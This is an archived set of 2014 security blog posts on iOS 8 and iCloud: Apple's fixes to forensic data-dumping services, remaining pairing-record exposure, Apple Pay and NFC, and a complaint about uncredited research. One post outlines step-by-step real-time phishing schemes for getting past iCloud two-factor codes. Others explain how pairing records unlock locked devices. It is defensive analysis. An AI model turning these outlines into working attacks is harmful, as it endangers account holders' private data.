# Apple Addresses iOS Surveillance and Forensics Vulnerabilities

_Captured: 2015-09-13 at 11:12 from [www.zdziarski.com](http://www.zdziarski.com/blog/?p=3820)_

After some preliminary testing, it appears that a number of vulnerabilities reported in [my recent research paper](http://www.zdziarski.com/blog/?p=3705) and [subsequent talk at HOPE/X](http://www.zdziarski.com/blog/?p=3441) have been addressed by Apple in iOS 8. The research outlined a number of risks for wireless remote surveillance, deep logical forensics, and other types of potential privacy intrusions fitting certain threat models such as high profile diplomats or celebrities, targeted surveillance, or similar threats.

Given that Apple has dropped the NDA for iOS 8, it appears that I can write freely about the improvements they've made to address the vulnerabilities I've outlined in my paper. Here's a summary of what's been fixed, what risks still remain, and some steps you can take to help protect the data on your device.

**What's been fixed**

File Relay (com.apple.mobile.file_relay) was the service responsible to causing the biggest potential privacy threat, by dumping large amounts of personal data from the device and bypassing the user's backup encryption password. The file relay service is now guarded. While the service still exists, all attempts to extract data from it will fail with a permission denied error (see screenshot at the bottom of this post). Only under certain circumstances, such as beta releases and on managed devices can the file relay be activated. Otherwise, the service is no longer available at all - _either_ with physical access to the device (via USB) or via WiFi. This is good news for consumers, as it not only eliminates the risk of wireless surveillance through this mechanism, but also prevents law enforcement forensics tools from dumping this information, which contains a significant amount of sensitive data: complete photo album, SMS messages, address book, typing cache, geolocation cache, application screenshots, and much more.

In addition to file relay, the threat of wireless surveillance has been addressed. Connections to a number of other services (house_arrest, afc, and others) on the device, has now finally been restricted and these mechanisms are deemed "usb only" services. Wireless clients are no longer permitted to obtain file handles to application sandboxes (only USB clients), so third party application data can no longer be dumped across WiFi. Additionally, wireless clients are not permitted to access the user's media folder via AFC (Apple File Connection) or access certain other types of data. NOTE: Backups can (as expected) still be performed wirelessly, and so turning on the backup encryption feature in iTunes, as well as having a strong password, is very important for security.

Lastly, wireless access to the built-in packet sniffer (com.apple.pcapd) has been disabled, and the service has been listed with a new "usb only" descriptor, so that lockdownd will refuse to attach to it over WiFi. The packet sniffer can only be accessed while the device is connected over USB, eliminating it as a surveillance risk, while retaining its use for debugging and engineering.

UPDATE: As per Apple's release notes, they have also provided a way to reset all pairing data (wiping clean all trusted computers). This takes place by resetting Location & Privacy, or by resetting Network Settings in General -> Reset.

**What's not fixed**

While closing off the file_relay service greatly improves the data security of the device, one mechanism that hasn't been addressed adequately is the ability to obtain a handle to application sandboxes across a USB connection, even while the device is locked. This capability is used by iTunes to access application data, but also presents a vulnerability: commercial forensics tools can (and presently do) take advantage of this mechanism to dump the third party application data from a seized device, if they have access to (or can generate) a valid pairing record with the device. For example, if you are detained at an airport or arrested and both your laptop and your phone is seized, or if your phone is seized unlocked (without a laptop present), a number of forensics tools including those from Oxygen, Cellebrite, AccessData, Elcomsoft and others are capable of dumping third party application data across USB. It is not designed to be protected with a backup password either, putting the data at risk of being intercepted in cleartext. Because a pair record can unlock the data-protection encryption using the EscrowBag included in the record, this data can be dumped if the device has not been shut down or rebooted since it was last used. Still, because this information is only accessible with physical possession of the device (and no longer wirelessly), the risk is less than in prior versions of iOS.

**Mitigating risk**

While the amount of data that can be scraped from an iOS 8 device has been greatly reduced, there is still some risk, and therefore still some steps you can, and should, take to ensure the data security of your device. When traveling through airports, or if you suspect you may be detained by law enforcement, powering down the device will cause the data-protection authentication (NSFileProtectionCompleteUntilFirstUserAuthentication) to be discarded from memory, rendering this type of attack unsuccessful, even with a valid pairing record from a desktop machine. Secondly, consider pair locking your iOS device using Apple's Configurator tool. I have [outlined instructions](http://www.zdziarski.com/blog/?p=2589) to do this. This will prevent an unlocked device from being able to establish a pair record with any device, other than the computer you've initially paired with in setting it up. Lastly, have a look at the tools Stroz Friedberg have outlined in their paper, [Mitigating Pairing Record Risks in Apple iOS Devices](http://www.strozfriedberg.com/wp-content/uploads/2014/08/SFWP_MitigatingPairingRecordRisks_08112014.pdf) to deauthorize pairing records on the device that may have been inadvertently created, or to ensure that a device does not have any unauthorized pairings.

**Future research**

While file relay is now restricted, it still exists, but has certain mechanisms to guard it. The file relay can be activated on managed devices where it is explicitly enabled in /Library/Managed Preferences/mobile/com.apple.mobile_file_relay.plist, and it also appears to be enabled in beta releases. Further research into this, and many other changes in iOS 8, is something that needs to be done, to ensure that there are no vulnerabilities in the mechanisms that control this access. Additionally, there are many functions and services now restricted to USB only, and ensuring that those services cannot be brought up over WiFi is also important.

**Conclusion**  
It appears that the threat of persistent wireless surveillance - my biggest concern - has been sufficiently addressed in iOS 8. Apple has also greatly reduced the exposure of Apple devices to commercial forensics tools. While I'm not yet sure how Apple now controls access to these deeper functions, it does appear that they have been better protected from abuse. Props and thanks to Apple for tackling a very complex and subtle problem that was difficult to explain.

With respect to forensics, please be aware that this does not affect law enforcement's ability to send a device into Apple to be partially dumped as per their [law enforcement process](https://www.apple.com/legal/more-resources/law-enforcement/). It also does not prevent law enforcement from obtaining warrants to obtain copies of your iCloud data or other data stored on Apple servers. It does, however, protect you from a number of third party tools which can be abused by third parties to illegally invade your privacy. Consider that only recently, such "law enforcement" tools were used by hackers to steal nude photos out of celebrities' iCloud accounts.

**Screenshot**

The result of attempting to dump any one of dozens of file relay data sources, which would (in iOS 7 and earlier) deliver clear text copies of personal data including address book, SMS messages, photo album, geolocation data, system caches, and other data. As you can see below, the result of requesting these sources is now an access denied error.

![Screen Shot 2014-09-09 at 5.40.49 PM](http://www.zdziarski.com/blog/wp-content/uploads/2014/09/Screen-Shot-2014-09-09-at-5.40.49-PM-1024x309.png)

> _[Screen Shot 2014-09-09 at 5.40.49 PM](http://www.zdziarski.com/blog/wp-content/uploads/2014/09/Screen-Shot-2014-09-09-at-5.40.49-PM.png)_

![Screen Shot 2014-09-10 at 11.51.22 AM](http://www.zdziarski.com/blog/wp-content/uploads/2014/09/Screen-Shot-2014-09-10-at-11.51.22-AM-1024x161.png)

> _This entry was posted in Forensics, iPhone, Security by Jonathan Zdziarski. Bookmark the permalink._

  


Is it OK to admit that NFC exists now? Apple's latest iPhone models now incorporate the near-field communications technology that's been around in Android phones for a few years… and a little too late, according to many experts. Over a year ago, KPMG ran a story citing NFC had already run its course and was obsolete, lacking widespread adoption in the mobile industry (ironically, they removed this story after the iPhone 6 launch). Companies like PayPal have also tabled the idea of NFC and instead focused on convincing businesses to accept non-POS forms of electronic payments. In the widespread abandonment of NFC, in fact, many new and promising technologies have crept up in its place. Apple's move to take this dinosaur and incorporate it into their bleeding edge line of products was an antiquated move in light of what they could have done, and the convenience it could have provided to consumers if they had instead looked at alternative technologies.

NFC's failed adoption in the United States presents an uphill challenge for Apple to break into the contactless payments business, if anything, for the sheer fact that most retail stores aren't even equipped with the technology - certainly not small businesses. As a consumer, you'll go to the trouble of getting Apple Pay set up on your device only to find that many stores won't be accepting it any time soon. For the next year or two, Apple Pay will be an unpredictable phenomenon in stores, at best, due to the lack of NFC hardware in retail.

Many alternative payment companies have attempted to work around NFC, rather than embrace it, with their own solutions that are more compatible with existing infrastructure. One of the best examples of this is [LoopPay](http://www.looppay.com). LoopPay uses a technology called MST, Magnetic Secure Transmission, to perform contactless electronic payments from your iPhone, using a small fob that you hold up to the magnetic card reader at a store. It's superior to NFC in that it works with the existing magnetic stripe reader technology making it compatible with virtually all existing POS infrastructure at stores. The consumer simply swipes their cards into the reader at home, then stores all of the data in their digital wallet. When you make a purchase, you just hold the fob up to the terminal, and it creates a magnetic field that makes the stripe reader think it read a card.

In contrast to MST, NFC requires an entirely new POS infrastructure for retail stores - at least in the United States, and that leaves Apple having to help foot the bill through backchannel deals, in order to roll out its new payment system. Had Apple acquired LoopPay, however, Apple Pay could have worked at all existing stores without any new infrastructure. MST could have been integrated with an Apple Pay account, tied to a banking institution, and seamlessly processed just like a credit card at any existing magnetic stripe terminal, with little risk.

In addition to the hardware limitations of NFC, Apple has recently announced that NFC will be locked down on the iPhone so that it will only work with Apple Pay. This isn't likely for competition's sake, but for security. While Apple fanboys may not have noticed, NFC has been under scrutiny in the past due to the security concerns it presents. Thomas Canon, an all around bright bloke and former coworker, made some news a while back [with a demonstration](http://www.computerworld.com/article/2472721/cybercrime-hacking/amazon-security-fail--pickpocket-bank-cards-with-nfc-phone-then-use-stolen-info-.html) showing how easy it is to electronically pickpocket Barclay's contactless bank cards in the UK. Too much access to the NFC chip on an Android phone can let you do some really nefarious things to the people around you, and since Apple has a longstanding relationship with devices seemingly left unattended at bars, it's no surprise that they've decided to lock down this technology to help prevent digital pickpocketing or other forms of criminal mischief.

Whether or not Apple Pay will be a hit will be decided by the consumer; Apple certainly has enough money to throw at a problem like this, and could easily buy their way into the mobile payments industry with special incentives for retail outlets. On the other hand, buying a company like LoopPay may have made much better business sense, and would have given their iPhone 6 launch immediate compatibility with nearly every store you'd want to shop at. Sometimes the most sensible route isn't always the the most high-tech route, especially when dealing with such a massive legacy infrastructure.

  


I've recently [updated my TL;DR](http://www.zdziarski.com/blog/?p=3783) regarding the recent celebrity iCloud hacks. I now summarize Apple's latest changes to improve their 2-factor authentication (2FA) . Apple has implemented not just a band-aid, but a very good security solution to protect iCloud accounts, by completely reinventing their own 2-step validation (sorry, I couldn't resist). As a result, users who have activated this feature will need to provide a one-time validation code in order to access their iCloud account from a web browser, or to provision iCloud from an iOS device. As my TL;DR suggests, this new technical measure would have prevented the celebrity iCloud hacks. So are Apple's new techniques really secure, even in light of the very technically un-savvy users who fall victim to iCloud phishing attacks?

While Apple has done their part to improve the security of iCloud, less than savvy users can still screw it up. First of all, by not having the feature turned on in the first place. Apple's two-step validation process is opt-in, and therefore it's important to make sure that users know about and understand the benefits to enabling this feature. In my opinion, Apple should force users to have this feature on if they enable Photo Stream or iCloud Backups, as they are likely to keep sensitive content in the cloud without necessarily knowing it.

So you're more savvy than that. You've already activated the new 2FA on your iCloud account. Are you truly safe from future phishing attacks?

**Phishing of the Future**

Phishing a 2FA-protected iCloud account probably isn't feasible today, because Apple now has the upper hand technologically, but lets take a look at what would be needed in the future, after scammers have had enough time to re-tool. Apple's new technical measures have essentially "broken" today's iCloud forensics tools, such as Elcomsoft's PPB, which was probably used by scammers to rip data from iCloud. At least this is the case when 2FA is turned on. The new measures have also broken the traditional username and password model for phishing, since you can't get anywhere without having a one-time validation code in addition to a password. So in order for a scammer to steal your iCloud data, they'd need to account for two important things: their forensics tools won't work with 2FA enabled, and they'll need a website capable of phishing the most recent, unused validation code. Neither of these are as easy as you might think, and would require a more sophisticated attack.

Apple's system sends a new code any time the user attempts to authenticate. This means that even if I were to get you to send me the code you've just received from Apple, it would be useless to me, since Apple would send a brand new code when I try to log in from my own browser, or from my iOS device. Codes also expire after a few minutes, so if I was to attack you later on - as most scammers do - your validation code would be useless. In order for an attack like this to work, an attacker would have to pull this off in real-time - and either dump your data immediately, or disable your account's 2-step validation while you're still sitting at the keyboard - both of which require a significant amount of know-how, and also would notify you by email.

As far as dumping the data goes, using Elcomsoft's forensics tools to dump your iCloud account is probably no longer an option, at least while 2FA is enabled on the account. Even when they update their software to support validation codes, their tool isn't going to operate as a phishing scam. It will try and log into an iCloud on its own to dump the data, meaning a new validation code will get sent, which will invalidate the one the victim just sent the scammer. So short of reverse engineering the iCloud protocol themselves, a scammer is going to take the path of least resistance, and try to disable the 2FA on your account so they could continue to use existing forensics tools. This, as I said, will trigger a notification to you - so unless you're daft enough to ignore it, you'll be able to do something about it before your data is stolen.

Now the most low-tech approach that could possibly succeed with today's tools would be for scammers to convince unsuspecting users that they must disable 2-step validation themselves, perhaps due to an account limitation, or some other lame excuse. There's no way for Apple to account for the analog hole of an un-savvy user doing dumb things with their account, perhaps with the exception of warning them prior to disabling it. Given how ineffective that attack would be, lets examine two more sophisticated attacks that wouldn't necessarily alarm users.

To fully appreciate the added security Apple has provided, what the scammer would have to do in order to steal your iCloud data, when you have 2-step validation set up.

**Scenario 1: Disable 2-Step Validation Themselves**

The scammer writes a web site phishing scam that:

  1. Prompts you for your Apple ID and password
  2. Emulates a web browser and logs itself into "Manage My Apple ID" on Apple's website
  3. Reads and parses the list of available devices to send a code to and lets you choose (in real-time).
  4. Relays your selection to Apple and waits for you to receive your validation code
  5. Phishes your validation code (in real-time).
  6. Disables 2-step validation on your account, or adds the scammer's phone number to the account (this should generate an email notification to you).
  7. Alert the scammer so that they can manually use an iCloud forensics scraping tool (e.g. existing Elcomsoft tools) to dump your data from iCloud before you realize what happened

This is by far the easiest scenario for a scammer to follow, and it is still extraordinarily complex. The scammer will have to write software that actually pretends it's you clicking through Apple's website. It also still requires the scammer to manually dump your iCloud data, counting on the victim to either ignore or be slow to act on the notifications you've received about changes to your iCloud account.

The next scenario, which is even more complicated, and more ridiculous, is the only way the scammer could dump your data in real-time, before you realized you were phished.

**Scenario 2: Dumping iCloud Data Real-Time**

The scammer reverse engineer's Apple's iCloud protocol for restoring a device backup (or photo stream) over iCloud.

The scammer writes a web site phishing scam that:

  1. Prompts you for your Apple ID and password.
  2. Emulates a device performing a restore from iCloud (as Elcomsoft does).
  3. Reads and parses the list of available devices to send a code to and lets you choose (in real-time).
  4. Relays your selection to Apple and waits for you to receive your validation code
  5. Phishes your validation code (in real-time).
  6. Rips your iCloud backups or photo stream using their own forensics software that they've built from reverse engineering the iCloud protocols.

Are both scenarios technically possible? Yes, but lets be honest here. If you have the skillset to craft either of these attacks, you are more likely to be working for a company like Apple than hacking them. You'd have to have some serious financial reward (or in iCloud's case, some serious perversion for stolen nude photos) to go to this kind of trouble. Most people don't keep anything of great financial value in the iCloud - at least nothing that doesn't have its own anti-fraud policies. So there's little motivation to put in this much work without a strong payoff. This type of attack is much more likely against financial institutions' banking systems. This _could_ become an issue for Apple after Apple Pay rolls out, depending on how well they secure the rest of the system.

While some scammers are savvy, most are not (based on examining their payloads) savvy enough to stage this type of real-time attack, reversing a number of private APIs in the process. It is more the likely that the "phish of the future" will simply try and convince victims that they should disable 2-step validation "for security purposes". These types of "low tech" attacks are where educating the consumer about such threats and risks is a public service that Apple can easily provide by means of a popup window before allowing the user to do anything stupid.

So is Apple's new 2FA really secure? It's pretty solid. Is it perfect? Of course not. "Security" isn't a black and white argument about whether or not a breach is impossible. "Security" is more a measurement between the amount of time and complexity required on the attacker's part to successfully breach a system. In this case, Apple has _greatly_ upped the game in terms of the amount of time needed to perform this type of attack, as well as the sheer complexity and skill required in order to craft this type of phish to attack an account protected with 2FA. If anything, Apple should follow up on this new technology by helping to educate the consumer about the risks of turning it off - or even more serious, the risks of not having it turned on in the first place.

  


Greetings!

You may not know me, but you probably know my research over the years. I've been researching security on Apple devices since 2007, when iPhone first came out, and even helped put together the very first jailbreaks. I've assisted law enforcement and military with forensics tools and support on iDevices, and had already started helping to make our world a much better place before Apple even had a law enforcement process. Additionally, I've written several books on iPhone ranging from development, to security, to forensics. Throughout my time researching Apple, I've found many vulnerabilities that affect the privacy of your customers (including me!), and have presented findings at numerous security and forensics conferences, including Black Hat, Hackers on Planet Earth (HOPE), Mobile Forensics World, Techno Security, HTCIA, and others. Never asked you to feature my books in your store (even when mine were the only iPhone books), never asked for free products, invites to anything, or felt entitled to anything. I love Apple products, and that's why it's been a fun experience to tinker with them, and it feels good to know that I've played a small, but consistent role in seeing their security improve over time.

You know what's not fun? When I work very hard on a research paper, go to the trouble of submitting it to a scientific journal, and pay out of my own pocket to travel to a conference to present my findings only to have Apple silently sweep the vulnerabilities I've discovered under the rug without ever disclosing their existence, the patches you've made, or giving the researcher proper credit in your security release notes. Today, you released your [security notes for iOS 8](http://support.apple.com/kb/HT6441), and guess what wasn't in them? Almost all of the things you fixed in Beta 5, that came directly from my research paper. Shortly after my research made national news, Apple fixed a number of these serious vulnerabilities that - at best - were the product of horribly sloppy engineering. Not small issues, either, mind you - issues that allowed for persistent, wireless surveillance of iOS devices, wirelessly intercepting packet data, and bypassing the consumer's backup encryption password to scrape highly sensitive consumer data (including SMS, photo album, geolocation database, and more) from the device using a number of undisclosed services Apple had never told the public even existed and were running on all 600 million consumer devices, in spite of the fact that numerous _commercial law enforcement forensics tools _were actively exploiting these services to dump highly sensitive content from consumers' mobile devices.

I am very glad to see that Apple has taken security seriously enough lately to address vulnerabilities quickly, and - from what I've seen - elegantly. I've even [written up a paper](http://www.zdziarski.com/blog/?p=3820) praising Apple for their quick and thorough response to these issues. That's the end-game of any security researcher's work, is to see a safer product on the market for consumers. What I'm not glad about at all is that Apple has seemingly swept these issues under the rug, to the degree that they're not even acknowledged in your security notes. Apple's code fixes can be clearly observed right in the iOS 8 firmware, and yet there is not a single mention of them in the release notes, nor any acknowledgments for the researcher. If there is any ethical practice to be expected in information security - or science of any kind for that matter - it is to properly acknowledge those who's research you've consumed. In many settings, failure to do so is considered plagiarism. My name somehow made it into the iOS 8 notes for some obscure address book encryption issue that I don't recall even reporting… yet there has been no mention of the more serious issues being fixed, or ever existing. I do see a number of jailbreak teams mentioned, and a number of others who's exploits you've no doubt incorporated into patches for iOS 8. Yet not one mention of file relay, wireless lockdown vulnerabilities, packet sniffer access control vulnerabilities, or backup encryption bypass vulnerabilities.

As a result of Apple's silence on these patches to iOS, your own consumers are left in the dark, being unaware that such vulnerabilities ever existed, except by third party accounts. This could potentially put many diplomats, government officials, even world leaders, CEOs, and other high-profile individuals (likely targets of the types of attacks I outline in my research) at risk, by being unable to assess whether or not any potential information breach may have occurred. Additionally, by not acknowledging the hard work of "some" select security researchers, you're insulting them and continuing to create a hostile environment for them to work in, making the idea of reaching out to Apple with findings even more remote. Apple has no open communication with security researchers, no bounty program, no legal disclosure policies or legal protections for researchers to come forward with findings, and now by snubbing some of them, can add insult onto that list.

I have been the repeated target of hostility from certain factions at Apple over the years. Apple continually interfered with my employment several years ago when I worked for a federally funded research and development center on defense related projects. Another time, Apple threatened to sue Gartner if I gave a talk highlighting weaknesses in the encryption of the iPhone 3G[s]. Many employees at Apple have also made very personal and rude remarks about me to a number of law enforcement personnel that we've mutually assisted. I am not sure what sparked all of this hostility toward me, but I assure you that it didn't start with me. I had really hoped that the culture at Apple has started to change with the new management, and with Apple's swift response to my findings (even though you initially ignored my email about them). I had hoped that at some point, I could begin to connect with Apple on some level on future vulnerabilities research, however the message that Apple is sending to me is that you have no desire to work with researchers like myself - for reasons left unknown.

I continue to love Apple products and the ingenuity behind them. There must be some fantastic developers at Apple with great minds, and I've come to appreciate that. Tim's even starting to grow on me, from what I've seen in interviews. If Apple still wants nothing to do with me, I can accept this. But I do expect the largest company in the world to have the ethical gumption to at least acknowledge serious vulnerabilities and give due credit to all security researchers, whether you like them or not. Personally, I don't care whether or not Apple acknowledges me… but this is already a big problem in the scientific community, and an issue that Apple should be setting a good example for, rather than aggravating. It is also doing a disservice to your consumers by sweeping serious vulnerabilities (that you have addressed) quietly under the rug.

Sincerely,

UPDATE:

Apple has since added a small knowledge base "note" at the bottom of their iOS Security Release notes vaguely explaining changes to "diagnostic services", however still does not explain the vulnerabilities that were addressed (or cite any credit for the changes). This small note appears to have been added as an afterthought, as it doesn't even show up in some copies of the page due to caching. Please refer to [my own blog entry](http://www.zdziarski.com/blog/?p=3820) for an outline of what Apple has addressed.

This entry was posted in [iPhone](http://www.zdziarski.com/blog/?cat=11), [Security](http://www.zdziarski.com/blog/?cat=14) by [Jonathan Zdziarski](http://www.zdziarski.com/blog/?author=1). Bookmark the [permalink](http://www.zdziarski.com/blog/?p=3853). 

  


In a recent announcement, Apple stated that they no longer unlock iOS (8) devices for law enforcement.

"_On devices running iOS 8, your personal data such as photos, messages (including attachments), email, contacts, call history, iTunes content, notes, and reminders is placed under the protection of your passcode. Unlike our competitors, Apple cannot bypass your passcode and therefore cannot access this data. So it's not technically feasible for us to respond to government warrants for the extraction of this data from devices in their possession running iOS 8."_

This is a significantly pro-privacy (and courageous) posture Apple is taking with their devices, and while about seven years late, is more than welcome. In fact, I am very impressed with Apple's latest efforts to beef up security all around, including iOS 8 and iCloud's new 2FA. I believe Tim Cook to be genuine in his commitment to user privacy; perhaps I'm one of the few who can see just how gutsy this move with iOS 8 is.

It's important to take a minute, however, to note that this does _not_ mean that the police can't get to your data. What Apple has done here is create for themselves plausible deniability in what they will do _for_ law enforcement. If we take this statement at face value, what has likely happened in iOS 8 is that photos, messages, and other sensitive data, which was previously only encrypted with hardware-based keys, is now being encrypted with keys derived from a PIN or passcode. No doubt this does improve security for everyone, by marrying encryption to the PIN (something they ought to have been doing all along). While it's _technically possible_ to brute force a PIN code, that doesn't mean it's _technically feasible_, and thus lets Apple off the hook in terms of legal obligation. Add a complex passcode into the mix, and it gets even uglier, having to choose any of a number of dictionary style attacks to get into your encrypted data. By redesigning the file system in this fashion (if this is the case), Apple has afforded themselves the ability to say, "the phone's data is encrypted with a PIN or passphrase, and so we're not legally required to hack it for you guys, so go pound sand". I am quite impressed, Mr. Cook! That took courage… _but it does not mean that your data is beyond law enforcement's reach._

In a [recent blog post](http://www.zdziarski.com/blog/?p=3820), I outlined a number of measures Apple took with iOS 8 to prevent many forensic artifacts from being dumped off of the device by existing commercial forensics tools. These services had completely bypassed the user's backup encryption password, affording the consumer virtually no protection from the many law enforcement forensics tools that took advantage of these vulnerabilities. Apple closed off many of these services in iOS 8. This was a great start to better securing iOS 8, but not everything has been completely protected.

In addition to what's been fixed, I also outlined some things that haven't yet been. What's left are services that iTunes (and Xcode) talk to in order to exchange information with third party applications, or access your media folder. Apple wants you to be able access your photos and other information from your desktop while the phone is locked - for ease of use. This, unfortunately, also opens up the capability for law enforcement to also use this mechanism to dump:

  * Your camera reel, videos, and recordings
  * Podcasts, Books, and other iTunes media
  * All third party application data

_Existing commercial forensics tools _can still acquire these artifacts from your device, even running iOS 8. I have tested with my own private forensics tools, as well, and confirmed this. I dumped all of my third party application data (including caches, databases, screenshots, etc), as well as my camera reel and other media… all within a few minutes and from my _locked_ iPhone running iOS 8 GM.

There is one big caveat though, but it's not a big problem for law enforcement. This technique requires access to a trusted pairing record on a desktop / laptop machine that is paired with your phone, and as of iOS 8 requires physical access to the phone. What does this mean? This means that if your'e arrested, the police will seize both your iPhone and all desktop / laptop machines you own, and use files on the desktop to dump and access all of the above data on your iPhone. This can also be done at an airport, if you are detained.

How does it work? While your photos and messages might indeed now be encrypted with a key derived from your PIN, the pairing records stored on your desktop have a "backup copy" of your keybag keys (the escrow bag), which can be used to unlock the encryption on your phone - without a PIN. Again, this was added so that iTunes could talk to your phone while it is still locked.

Fortunately, there are some precautions you can take to ensure your privacy. One small trick is to shut down your iPhone whenever you go through airport security or customs. Why? Because Apple has included a kill switch that prevents your pairing records from being able to unlock your iPhone if it's been shut down. The pairing record vulnerability only works if you've used your phone since it was last rebooted. Secondly, make sure you're using strong encryption on your desktop / laptops, and make sure your computers are all shut down when not in use… especially when going through airport security. There are a number of forensics tools capable of dumping the memory (and therefore, encryption keys) of your encrypted disk if you've left your computer asleep or in hibernate mode. Shut it down.

While setting a backup password is critical to protecting the rest of your private data on an iPhone, it won't help you here, because none of these interfaces honor the consumer's backup password. Your data is not encrypted when dumped from these services. If you don't lock your device with a PIN, of course, all of this data is at risk all of the time, so be sure to use a PIN too.

Apple could stand to greatly improve this by either requiring the user enter their backup password for iTunes to talk to it while the device is locked (and encrypt all of this with that password), or to simply offer the user the option (via iTunes) to prevent the iPhone from being accessible at all while locked. Many users would gladly check that box for improved security.

Apple has done a great job of breaking a number of law enforcement forensics tools and features with the release of iOS 8. Some existing features are still likely to work, however, and your third party application data and media folder are still potentially at risk from anyone with access to these commercial tools, or someone with the know-how to use open-source tools such as libimobiledevice.

On a philosophical note, some seem genuinely upset about Apple's latest decision, arguing law enforcement is "entitled" to your data, in order to fight crime. The other side of the coin is this: should manufacturers be required to weaken the strength of their encryption (and the security of their products) just to make law enforcement forensics possible? Wouldn't that amount to engineering back doors into all products? If you still feel this way, consider also that by improving the security of their products, Apple has improved it for everyone - CEOs, the President (who's been seen using an iPad to receive daily briefings), congressmen, judges, our own military and many others. If you're going to weaken security to make forensics possible, you're also weakening it for everyone, opening the door for foreign governments and cyber criminals to attack all of us. For the sake of privacy and overall security, the only logical solution is to make products as secure as possible, and let good detective work do the crime solving, rather than an easy button.

  


To my fantastic Ballistic customers,

It's been an incredible six years watching Ballistic grow from a humble trajectory computer to top the charts as the App Store's most popular field firing system. Ballistic has grown organically - a rarity in this industry - through word of mouth, and nothing more. Not a single penny was ever spent on advertising to grow Ballistic, and yet it's been featured in the NRA's rifleman magazine, reviewed in a number of online magazines and blogs, and is now used by many world class competition shoots, military, and police sharpshooters. It has become a trusted name in the industry, and for that I am deeply grateful to all of you who have told your friends about it, and helped support the product with great ideas and requests.

Many of you have been asking me when an Android version is coming, or when other platforms will be supported, or new hardware that's just now coming out, and are eager to see Ballistic continue to grow in capabilities. There are a lot of great new things that can be done with Ballistic, and I think there's much more in store. I can't do all of this alone, though, and so I've been in talks over the past few months with a team who has the resources to take the Ballistic suite of products to the next level.

On September 19, Peak Studios acquired the rights to the Ballistic suite of products, and has some amazing plans for it. I have spent a lot of time discussing their vision for Ballistic, and they've earned my trust with a project that I hold dear to my heart. The Peak Studios team is incredibly talented, and can take Ballistic to places that I haven't had the time to as a personal project. Peak Studios has the skill and resources to devote to Ballistic, and I think we'll all be really impressed with where the product goes in the future.

I am working with the Peak Studios team to ensure a very smooth and uninterrupted transition, while helping to deal with the migration of codebase and any issues that may crop up. In the meantime, please direct all of your support requests to ios-support@ballisticapp.com.

I am still continuing to develop App Store apps, and have recently set my sights on the emerging fitness market, with my latest application Fitcubs (<http://www.fitcubs.com>), among other ideas. I hope to see you around in other markets, as it's been a pleasure talking to many of you and supporting you as a customer. A big part of Ballistic's success has been it's great customer base. From the bottom of my heart, thank you.

Jonathan

  


Apple's recent security announcement suggested that they no longer have the ability to dump your content from iOS 8 devices:

_ "On devices running iOS 8, your personal data such as photos, messages (including attachments), email, contacts, call history, iTunes content, notes, and reminders is placed under the protection of your passcode. Unlike our competitors, Apple cannot bypass your passcode and therefore cannot access this data. So it's not technically feasible for us to respond to government warrants for the extraction of this data from devices in their possession running iOS 8."_

It looks like there are some glitches in this new encryption scheme, however, and some of the files being stored on your iOS 8 device are not getting encrypted in this way. If you copy files over to your device using iTunes' "File Sharing" feature or sync videos that appear in the "Home Videos" section of iOS, these files are _not_ getting placed under the protection of your passcode. Theoretically, Apple could dump these in Cupertino, if given your locked iPhone.

As I pointed out in [recent blog post](http://www.zdziarski.com/blog/?p=3875), law enforcement forensics tools can still dump a lot of data from iOS 8 devices too, if they seize your desktop/laptop and copy a pairing record. There was one caveat to this, however, and that was if your device was shut off, they could not get to any of that data until the user entered their passcode again. It looks like, due to this glitch, at least some files are accessible, even if the device has been powered down.

This all came out of a brief discussion this morning with a fellow colleague in the forensics world, Kevin DeLong, who has been teaching forensics investigation classes for years now. He noted that one of the tools he's been using, iFunbox (a freeware tool to access data on your iPhone), was somehow able to access some of his application files even after rebooting his phone. This conflicted with what we know about the escrow bag stored in pairing files, which normally can't unlock encryption after a device is rebooted, until the user first enters their passcode. After doing some protocol-level testing, I was able to reproduce this, as well as identify a number of files in iOS 8 that are getting assigned the wrong protection class, and do not get encrypted with with keys dependent on the passcode, as Apple claims.

This is likely just a bug, and I suspect once Apple understands what's going on, they'll issue a fix. But for now, it's important to note that the following data may be at risk under certain circumstances (such as being detailed at an airport, even if you shut your phone down).

  * Any files copied over from iTunes using "File Sharing" under "Apps".
  * Any videos copied in from iTunes that fall under the "Home Videos" section of the Videos app. This likely extends to music videos and movies.
  * Any databases stored in Third Party applications are protected, but their -shm (shared-memory write-ahead index) counterpart files are at risk.

Apple has not given any indication that they would be willing to dump this information on behalf of law enforcement, but until they fix the protection classes that these files are assigned, the technical possibility exists to copy this data off without having the passcode.

Take appropriate steps to protect your data. To protect yourself from forensics tools, follow [these instructions](http://www.zdziarski.com/blog/?p=2589) to pair lock your iOS device, so that a new pairing cannot be created, even if you're compelled to give up your passcode. Encrypt your desktop/laptop so that pairing files cannot be copied off while it is properly shut down.

I have filed this bug with Apple as bug #18439395.

  


Apple's new policy about law enforcement is ruffling some feathers with FBI, and has been a point of debate among the rest of us. It has become such because it's been viewed as just that - a policy - rather than what it really is, which is a design change. With iOS 8, Apple has finally brought their operating system up to what most experts would consider "acceptable security". My tone here suggests that I'm saying all prior versions of iOS had substandard security - that's exactly what I'm saying. I've been hacking on the phone since they first came out in 2007. Since the iPhone first came out, Apple's data security has had a dismal track record. Even as recent as iOS 7, Apple's file system left almost all user data inadequately encrypted (or protected), and often riddled with holes - or even services that dished up your data to anyone who knew how to ask. Today, what you see happening with iOS 8 is a major improvement in security, by employing proper encryption to protect data at rest. Encryption, unlike people, knows no politics. It knows no policy. It doesn't care if you're law enforcement, or a criminal. Encryption, when implemented properly, is indiscriminate about who it's protecting your data from. It just protects it. That is key to security.

Up until iOS 8, Apple's encryption _didn't_ adequately protect users because it wasn't designed properly (in my expert opinion). Apple relied, instead, on the operating system to protect user data, and that allowed law enforcement to force Apple to dump what amounted to almost all of the user data from any device - because it was technically feasible, and there was nobody to stop them from doing it. From iOS 7 and back, the user data stored on the iPhone was not encrypted with a key that was derived from the user's passcode. Instead, it was protected with a key derived from the device's hardware… which is as good as having no key at all. Once you booted up any device running iOS 7 or older, much of that user data could be immediately decrypted in memory, allowing Apple to dump it and provide a tidy disk image to the police. Incidentally, it also allowed a number of hackers (including criminals) to read it.

When Apple fixed their poor encryption standards in iOS 8, they fixed what I viewed as a major flaw in the security of their device. Devices that not only you and I use, but also used by our President, our military, public officials, high profile individuals (such as celebrities and CEOs), and diplomats from other countries too. These devices are in the hands of world leaders and military - so there's really no question that it has to be _military grade_. This is no longer just a product for hipsters. The fact that I could charge thousands per head to train a diplomatic security team about iOS forensics is evidence to the critical and urgent need for security on the device by our world leaders. If you had any idea just how many physical hardware modifications have gone into devices that public officials are allowed to use, you'd realize that governments know better than to trust prior versions of iOS.

